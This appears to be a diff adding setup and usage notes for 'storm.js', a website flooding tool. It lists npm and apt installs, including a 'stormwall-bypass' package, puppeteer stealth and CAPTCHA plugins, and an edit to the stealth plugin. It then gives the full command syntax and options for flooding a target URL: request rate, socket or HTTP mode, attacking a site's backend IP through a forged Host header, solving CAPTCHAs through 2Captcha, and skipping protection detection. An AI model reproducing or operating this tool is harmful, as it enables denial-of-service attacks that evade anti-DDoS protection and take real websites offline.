@@ -1,0 +1,37 @@
+
+sudo npm cache clean -f
+sudo npm install -g n
+sudo n stable
+
+npm install proxy-agent
+npm install request
+npm install puppeteer-extra
+npm i puppeteer
+npm install puppeteer-extra-plugin-stealth
+
+sudo npm i request request-promise-native url vm fs events net colors minimist user-agents stormwall-bypass puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-extra-plugin-recaptcha xmlhttprequest chrome-aws-lambda puppeteer@3.3.0
+
+nano +155 node_modules/puppeteer-extra-plugin-stealth/index.js
+
+AND REMOVE LINE
+
+apt-get install gconf-service libasound2 libatk1.0-0 libatk-bridge2.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils libgbm-dev wget -y;
+
+
+node storm.js --url '[URL]' --time [TIME] --host [CUSTOM HOST HEADER] --mode [MODE] --method [METHOD] --bcookie [CALLBACK] --delay [DELAY] --rate [RATE] --null [NULL] --info [INFO] --engine [ENGINE] --skip [SKIP] --click '[CLICK]' --key [2Captcha KEY] --postdata '[POSTDATA]'
+  
+  [URL] - It's a target. Example: https://example.com
+  [TIME] - Boottime
+  [CUSTOM HOST HEADER] - You can use it to attack domain via their backend IP. For example backend ip of example.com - 1.1.1.1, so you should use: --url 'http://1.1.1.1' --host example.com
+  [MODE] - socket/http
+  [METHOD] - GET / POST
+  [CALLBACK] - Amount of cookies callback from browser_engine. If you use --bcookie 2, then browser_engine will return 2+ cookies (name1=value1; name2=value2). It's useful for control bypass. For example i can make auto-retry if cookies < callback cookies.
+  [DELAY] - Delay in msec after browser_engine open site. Example: 7000-8000 for Nooder.
+  [RATE] - Time in msec to wait after each request (http mode). --rate 1000 == 1 r/s || --rate 500 = 5 r/s
+  [NULL] - True/False | Less headers for socket mode
+  [INFO] - True/False | Display statistic about bypass and other // disabled now
+  [ENGINE] - True/False | Force to use browser_engine
+  [SKIP] - True/False | Force to skip protection detect, will start flood instant after launch script
+  [CLICK] - Function for browser_engine. Browser will click on anything that contains [CLICK]. Example: --click 'example' --- Browser will try to found for example button or link which contain 'example' text
+  [KEY] - 2Captcha Key for browser_engine. First request's will be start after 120 sec~ after browser_engine start work, because 2Captcha service can solve captcha 20-80 sec~.
+  [POSTDATA] - PostData...
